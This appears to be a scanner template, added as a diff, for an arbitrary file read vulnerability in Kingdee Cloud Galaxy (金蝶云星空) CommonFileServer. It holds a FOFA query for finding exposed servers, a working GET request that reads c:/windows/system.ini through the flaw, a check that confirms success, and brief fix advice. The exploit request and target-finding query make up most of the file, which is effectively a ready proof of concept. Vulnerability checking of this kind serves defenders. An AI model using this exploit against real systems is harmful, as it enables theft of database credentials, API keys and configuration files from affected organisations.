@@ -1,0 +1,36 @@
+{
+  "product": "金蝶云星空",
+  "vul_name": "金蝶云星空 CommonFileServer 任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "金蝶云星空V7.X、V8.X所有私有云和混合云版本存在一个通用漏洞，攻击者可利用此漏洞获取服务器上的任意文件，包括数据库凭据、API密钥、配置文件等，从而获取系统权限和敏感信息。",
+  "version": "6.x-8.x版本",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"金蝶云星空-管理中心\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_56698744/article/details/134398238",
+  "fix": [
+    "减小互联网暴露面，设置ACL权限，安全设备",
+    "最重要的是打好补丁"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/CommonFileServer/c:/windows/system.ini"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "for 16-bit app support"
+        }
+      ]
+    }
+  }
+}
